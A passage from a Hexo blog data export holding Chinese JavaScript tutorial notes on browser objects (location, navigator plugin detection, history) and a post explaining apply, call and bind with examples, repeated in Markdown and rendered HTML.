class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location.reload(); <span class=\"comment\">//重新加载（有可能从缓存中加载）</span></span><br><span class=\"line\">location.reload(<span class=\"literal\">true</span>); <span class=\"comment\">//重新加载（从服务器重新加载）</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"navigator-对象\"><a href=\"#navigator-对象\" class=\"headerlink\" title=\"navigator 对象\"></a>navigator 对象</h2><p>用于识别客户端浏览器</p>\n<h3 id=\"检测插件\"><a href=\"#检测插件\" class=\"headerlink\" title=\"检测插件\"></a>检测插件</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//检测插件（在IE 中无效）</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hasPlugin</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">  name = name.toLowerCase();</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; navigator.plugins.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (navigator.plugins[i].name.toLowerCase().indexOf(name) &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//检测Flash</span></span><br><span class=\"line\">alert(hasPlugin(<span class=\"string\">\"Flash\"</span>));</span><br><span class=\"line\"><span class=\"comment\">//检测QuickTime</span></span><br><span class=\"line\">alert(hasPlugin(<span class=\"string\">\"QuickTime\"</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//检测IE 中的插件</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hasIEPlugin</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">new</span> ActiveXObject(name);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> (ex) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//检测Flash</span></span><br><span class=\"line\">alert(hasIEPlugin(<span class=\"string\">\"ShockwaveFlash.ShockwaveFlash\"</span>));</span><br><span class=\"line\"><span class=\"comment\">//检测QuickTime</span></span><br><span class=\"line\">alert(hasIEPlugin(<span class=\"string\">\"QuickTime.QuickTime\"</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//检测所有浏览器中的Flash</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hasFlash</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> result = hasPlugin(<span class=\"string\">\"Flash\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!result) &#123;</span><br><span class=\"line\">    result = hasIEPlugin(<span class=\"string\">\"ShockwaveFlash.ShockwaveFlash\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//检测所有浏览器中的QuickTime</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hasQuickTime</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> result = hasPlugin(<span class=\"string\">\"QuickTime\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!result) &#123;</span><br><span class=\"line\">    result = hasIEPlugin(<span class=\"string\">\"QuickTime.QuickTime\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//检测Flash</span></span><br><span class=\"line\">alert(hasFlash());</span><br><span class=\"line\"><span class=\"comment\">//检测QuickTime</span></span><br><span class=\"line\">alert(hasQuickTime());</span><br></pre></td></tr></table></figure>\n<h3 id=\"注册处理程序\"><a href=\"#注册处理程序\" class=\"headerlink\" title=\"注册处理程序\"></a>注册处理程序</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">navigator.registerContentHandler(<span class=\"string\">\"application/rss+xml\"</span>, <span class=\"string\">\"http://www.somereader.com?feed=%s\"</span>, <span class=\"string\">\"Some Reader\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">navigator.registerProtocolHandler(<span class=\"string\">\"mailto\"</span>, <span class=\"string\">\"http://www.somemailclient.com?cmd=%s\"</span>, <span class=\"string\">\"Some Mail Client\"</span>);</span><br></pre></td></tr></table></figure>\n<h2 id=\"screen-对象\"><a href=\"#screen-对象\" class=\"headerlink\" title=\"screen 对象\"></a>screen 对象</h2><p>保存着与客户端显示器有关的信息，这些信息一般只用于站点分析。</p>\n<h2 id=\"history-对象\"><a href=\"#history-对象\" class=\"headerlink\" title=\"history 对象\"></a>history 对象</h2><p>判断历史记录的数量<code>history.length</code><br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (history.length == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\"><span class=\"comment\">//这应该是用户打开窗口后的第一个页面</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>向后或向前导航到任意页面<code>go(),back(),forward()</code><br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//后退一页</span></span><br><span class=\"line\">history.go(<span class=\"number\">-1</span>);</span><br><span class=\"line\"><span class=\"comment\">//前进一页</span></span><br><span class=\"line\">history.go(<span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"comment\">//前进两页</span></span><br><span class=\"line\">history.go(<span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//跳转到最近的wrox.com 页面</span></span><br><span class=\"line\">history.go(<span class=\"string\">\"wrox.com\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//跳转到最近的nczonline.net 页面</span></span><br><span class=\"line\">history.go(<span class=\"string\">\"nczonline.net\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//后退一页</span></span><br><span class=\"line\">history.back();</span><br><span class=\"line\"><span class=\"comment\">//前进一页</span></span><br><span class=\"line\">history.forward();</span><br></pre></td></tr></table></figure></p>"},{"title":"apply,call,bind--知识总结及实践案例","date":"2019-01-31T02:56:39.000Z","updated":"2019-01-31T02:56:39.000Z","_content":"# 前言\napply和call经常使用，今天突然看到bind方法，不熟悉，于是把三者整体梳理学习下。\n\n# 概述\n三者都是为了改变函数的作用域（上下文context），也就是改变函数中this的指向，同时可以附加参数。但是三者的具体使用有什么异同呢？\n\n<!-- more -->\n# 详述\n\n## 语法区别\n语法：\n```js\nfunc.apply(thisArg[, argsArray])\n\nfunc.call(thisArg[, arg1[, arg2[, ...]]])\ns\nvar otherFunc = func.bind(thisArg[, arg1[, arg2[, ...]]]);\notherFunc();\n```\n区别：\n1. apply与call类似，区别在于apply第二个参数是一个参数数组或者arguments对象，call从第二个参数开始，罗列一个个参数。（对于记忆，我的方法是apply+arguments，都是a开头，这样就不会混淆两者的传参形式了。）\n2. bind是创建一个新的函数，参数形式与call一样。\n3. apply/call与bind的区别是apply/call是在执行函数函数指定this指向，bind是先创建一个改变了this指向的新函数，然后再调用执行。\n\n## 使用场景\n### 检测数组\n\n```js\nif(Object.prototype.toString.call(obj) === '[object Array]'){\n  //执行数组操作\n}\n```\n当然，检测数组，同一个全局变量下可以用a`rr instanceof Array`，有框架结构就不行了，另外也可以用ES5的`Array.isArray(arr)`;\n\n### 类数组转成数组\n常用类数组对象有arguments,NodeList（包括类NodeList的元素集合）。\n```js\nArray.prototype.slice.call(arguments)\n```\n\n### 继承\n```js\nfunction SuperType(name) {\n  this.name = name;\n  this.colors = [\"red\", \"blue\", \"green\"];\n}\nSuperType.prototype.sayName = function() {\n  alert(this.name);\n};\nfunction SubType(name, age) {\n  //继承属性\n  SuperType.call(this, name);\n  this.age = age;\n}\n//继承方法\nSubType.prototype = new SuperType();\nSubType.prototype.constructor = SubType;\nSubType.prototype.sayAge = function() {\n  alert(this.age);\n};\n```\n### 事件绑定\n```js\nvar foo = {\n    bar : 1,\n    eventBind: function(){\n        $('.someClass').on('click',function(event) {\n            /* Act on the event */\n            console.log(this.bar);      //1\n        }.bind(this));\n    }\n}\n\n```\n### setTimeout\n```js\nfunction LateBloomer() {\n  this.petalCount = Math.ceil(Math.random() * 12) + 1;\n}\n\n// 在 1 秒钟后声明 bloom\nLateBloomer.prototype.bloom = function() {\n  setTimeout(this.declare.bind(this), 1000);\n};\n\nLateBloomer.prototype.declare = function() {\n  console.log('I am a beautiful flower with ' +\n    this.petalCount + ' petals!');\n};\n\nvar flower = new LateBloomer();\nflower.bloom();  // 一秒钟后, 调用'declare'方法\n```\n# 后记","source":"_posts/2019/01/2019-01-31-apply-call-bind.md","raw":"---\ntitle: apply,call,bind--知识总结及实践案例\ntags:\n  - JavaScript\ncategories:\n  - 前端\ndate: 2019-01-31 10:56:39\nupdated: 2019-01-31 10:56:39\n---\n# 前言\napply和call经常使用，今天突然看到bind方法，不熟悉，于是把三者整体梳理学习下。\n\n# 概述\n三者都是为了改变函数的作用域（上下文context），也就是改变函数中this的指向，同时可以附加参数。但是三者的具体使用有什么异同呢？\n\n<!-- more -->\n# 详述\n\n## 语法区别\n语法：\n```js\nfunc.apply(thisArg[, argsArray])\n\nfunc.call(thisArg[, arg1[, arg2[, ...]]])\ns\nvar otherFunc = func.bind(thisArg[, arg1[, arg2[, ...]]]);\notherFunc();\n```\n区别：\n1. apply与call类似，区别在于apply第二个参数是一个参数数组或者arguments对象，call从第二个参数开始，罗列一个个参数。（对于记忆，我的方法是apply+arguments，都是a开头，这样就不会混淆两者的传参形式了。）\n2. bind是创建一个新的函数，参数形式与call一样。\n3. apply/call与bind的区别是apply/call是在执行函数函数指定this指向，bind是先创建一个改变了this指向的新函数，然后再调用执行。\n\n## 使用场景\n### 检测数组\n\n```js\nif(Object.prototype.toString.call(obj) === '[object Array]'){\n  //执行数组操作\n}\n```\n当然，检测数组，同一个全局变量下可以用a`rr instanceof Array`，有框架结构就不行了，另外也可以用ES5的`Array.isArray(arr)`;\n\n### 类数组转成数组\n常用类数组对象有arguments,NodeList（包括类NodeList的元素集合）。\n```js\nArray.prototype.slice.call(arguments)\n```\n\n### 继承\n```js\nfunction SuperType(name) {\n  this.name = name;\n  this.colors = [\"red\", \"blue\", \"green\"];\n}\nSuperType.prototype.sayName = function() {\n  alert(this.name);\n};\nfunction SubType(name, age) {\n  //继承属性\n  SuperType.call(this, name);\n  this.age = age;\n}\n//继承方法\nSubType.prototype = new SuperType();\nSubType.prototype.constructor = SubType;\nSubType.prototype.sayAge = function() {\n  alert(this.age);\n};\n```\n### 事件绑定\n```js\nvar foo = {\n    bar : 1,\n    eventBind: function(){\n        $('.someClass').on('click',function(event) {\n            /* Act on the event */\n            console.log(this.bar);      //1\n        }.bind(this));\n    }\n}\n\n```\n### setTimeout\n```js\nfunction LateBloomer() {\n  this.petalCount = Math.ceil(Math.random() * 12) + 1;\n}\n\n// 在 1 秒钟后声明 bloom\nLateBloomer.prototype.bloom = function() {\n  setTimeout(this.declare.bind(this), 1000);\n};\n\nLateBloomer.prototype.declare = function() {\n  console.log('I am a beautiful flower with ' +\n    this.petalCount + ' petals!');\n};\n\nvar flower = new LateBloomer();\nflower.bloom();  // 一秒钟后, 调用'declare'方法\n```\n# 后记","slug":"2019-01-31-apply-call-bind","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8wn004iwovvfqhfkv16","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>apply和call经常使用，今天突然看到bind方法，不熟悉，于是把三者整体梳理学习下。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>三者都是为了改变函数的作用域（上下文context），也就是改变函数中this的指向，同时可以附加参数。但是三者的具体使用有什么异同呢？</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"语法区别\"><a href=\"#语法区别\" class=\"headerlink\" title=\"语法区别\"></a>语法区别</h2><p>语法：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func.apply(thisArg[, argsArray])</span><br><span class=\"line\"></span><br><span class=\"line\">func.call(thisArg[, arg1[, arg2[, ...]]])</span><br><span class=\"line\">s</span><br><span class=\"line\"><span class=\"keyword\">var</span> otherFunc = func.bind(thisArg[, arg1[, arg2[, ...]]]);</span><br><span class=\"line\">otherFunc();</span><br></pre></td></tr></table></figure></p>\n<p>区别：</p>\n<ol>\n<li>apply与call类似，区别在于apply第二个参数是一个参数数组或者arguments对象，call从第二个参数开始，罗列一个个参数。（对于记忆，我的方法是apply+arguments，都是a开头，这样就不会混淆两者的传参形式了。）</li>\n<li>bind是创建一个新的函数，参数形式与call一样。</li>\n<li>apply/call与bind的区别是apply/call是在执行函数函数指定this指向，bind是先创建一个改变了this指向的新函数，然后再调用执行。</li>\n</ol>\n<h2 id=\"使用场景\"><a href=\"#使用场景\" class=\"headerlink\" title=\"使用场景\"></a>使用场景</h2><h3 id=\"检测数组\"><a href=\"#检测数组\" class=\"headerlink\" title=\"检测数组\"></a>检测数组</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"built_in\">Object</span>.prototype.toString.call(obj) === <span class=\"string\">'[object Array]'</span>)&#123;</span><br><span class=\"line\">  <span class=\"comment\">//执行数组操作</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当然，检测数组，同一个全局变量下可以用a<code>rr instanceof Array</code>，有框架结构就不行了，另外也可以用ES5的<code>Array.isArray(arr)</code>;</p>\n<h3 id=\"类数组转成数组\"><a href=\"#类数组转成数组\" class=\"headerlink\" title=\"类数组转成数组\"></a>类数组转成数组</h3><p>常用类数组对象有arguments,NodeList（包括类NodeList的元素集合）。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Array</span>.prototype.slice.call(<span class=\"built_in\">arguments</span>)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"继承\"><a href=\"#继承\" class=\"headerlink\" title=\"继承\"></a>继承</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SuperType</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.colors = [<span class=\"string\">\"red\"</span>, <span class=\"string\">\"blue\"</span>, <span class=\"string\">\"green\"</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">SuperType.prototype.sayName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"keyword\">this</span>.name);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SubType</span>(<span class=\"params\">name, age</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//继承属性</span></span><br><span class=\"line\">  SuperType.call(<span class=\"keyword\">this</span>, name);</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.age = age;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//继承方法</span></span><br><span class=\"line\">SubType.prototype = <span class=\"keyword\">new</span> SuperType();</span><br><span class=\"line\">SubType.prototype.constructor = SubType;</span><br><span class=\"line\">SubType.prototype.sayAge = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"keyword\">this</span>.age);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"事件绑定\"><a href=\"#事件绑定\" class=\"headerlink\" title=\"事件绑定\"></a>事件绑定</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> foo = &#123;</span><br><span class=\"line\">    bar : <span class=\"number\">1</span>,</span><br><span class=\"line\">    eventBind: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        $(<span class=\"string\">'.someClass'</span>).on(<span class=\"string\">'click'</span>,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">event</span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">/* Act on the event */</span></span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.bar);      <span class=\"comment\">//1</span></span><br><span class=\"line\">        &#125;.bind(<span class=\"keyword\">this</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"setTimeout\"><a href=\"#setTimeout\" class=\"headerlink\" title=\"setTimeout\"></a>setTimeout</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">LateBloomer</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.petalCount = <span class=\"built_in\">Math</span>.ceil(<span class=\"built_in\">Math</span>.random() * <span class=\"number\">12</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 在 1 秒钟后声明 bloom</span></span><br><span class=\"line\">LateBloomer.prototype.bloom = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  setTimeout(<span class=\"keyword\">this</span>.declare.bind(<span class=\"keyword\">this</span>), <span class=\"number\">1000</span>);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">LateBloomer.prototype.declare = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">'I am a beautiful flower with '</span> +</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.petalCount + <span class=\"string\">' petals!'</span>);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> flower = <span class=\"keyword\">new</span> LateBloomer();</span><br><span class=\"line\">flower.bloom();  <span class=\"comment\">// 一秒钟后, 调用'declare'方法</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1>","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>apply和call经常使用，今天突然看到bind方法，不熟悉，于是把三者整体梳理学习下。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>三者都是为了改变函数的作用域（上下文context），也就是改变函数中this的指向，同时可以附加参数。但是三者的具体使用有什么异同呢？</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"语法区别\"><a href=\"#语法区别\" class=\"headerlink\" title=\"语法区别\"></a>语法区别</h2><p>语法：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func.apply(thisArg[, argsArray])</span><br><span class=\"line\"></span><br><span class=\"line\">func.call(thisArg[, arg1[, arg2[, ...]]])</span><br><span class=\"line\">s</span><br><span class=\"line\"><span class=\"keyword\">var</span> otherFunc = func.bind(thisArg[, arg1[, arg2[, ...]]]);</span><br><span class=\"line\">otherFunc();</span><br></pre></td></tr></table></figure></p>\n<p>区别：</p>\n<ol>\n<li>apply与call类似，区别在于apply第二个参数是一个参数数组或者arguments对象，call从第二个参数开始，罗列一个个参数。（对于记忆，我的方法是apply+arguments，都是a开头，这样就不会混淆两者的传参形式了。）</li>\n<li>bind是创建一个新的函数，参数形式与call一样。</li>\n<li>apply/call与bind的区别是apply/call是在执行函数函数指定this指向，bind是先创建一个改变了this指向的新函数，然后再调用执行。</li>\n</ol>\n<h2 id=\"使用场景\"><a href=\"#使用场景\" class=\"headerlink\" title=\"使用场景\"></a>使用场景</h2><h3 id=\"检测数组\"><a href=\"#检测数组\" class=\"headerlink\" title=\"检测数组\"></a>检测数组</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"built_in\">Object</span>.prototype.toString.call(obj) === <span class=\"string\">'[object Array]'</span>)&#123;</span><br><span class=\"line\">  <span class=\"comment\">//执行数组操作</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当然，检测数组，同一个全局变量下可以用a<code>rr instanceof Array</code>，有框架结构就不行了，另外也可以用ES5的<code>Array.isArray(arr)</code>;</p>\n<h3 id=\"类数组转成数组\"><a href=\"#类数组转成数组\" class=\"headerlink\" title=\"类数组转成数组\"></a>类数组转成数组</h3><p>常用类数组对象有arguments,NodeList（包括类NodeList的元素集合）。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Array</span>.prototype.slice.call(<span class=\"built_in\">arguments</span>)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"继承\"><a href=\"#继承\" class=\"headerlink\" title=\"继承\"></a>继承</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SuperType</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.colors = [<span class=\"string\">\"red\"</span>, <span class=\"string\">\"blue\"</span>, <span class=\"string\">\"green\"</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">SuperType.prototype.sayName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"keyword\">this</span>.name);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SubType</span>(<span class=\"params\">name, age</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//继承属性</span></span><br><span class=\"line\">  SuperType.call(<span class=\"keyword\">this</span>, name);</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.age = age;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//继承方法</span></span><br><span class=\"line\">SubType.prototype = <span class=\"keyword\">new</span> SuperType();</span><br><span class=\"line\">SubType.prototype.constructor = SubType;</span><br><span class=\"line\">SubType.prototype.sayAge = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"keyword\">this</span>.age);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"事件绑定\"><a href=\"#事件绑定\" class=\"headerlink\" title=\"事件绑定\"></a>事件绑定</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> foo = &#123;</span><br><span class=\"line\">    bar : <span class=\"number\">1</span>,</span><br><span class=\"line\">    eventBind: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        $(<span class=\"string\">'.someClass'</span>).on(<span class=\"string\">'click'</span>,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">event</span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">/* Act on the event */</span></span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.bar);      <span class=\"comment\">//1</span></span><br><span 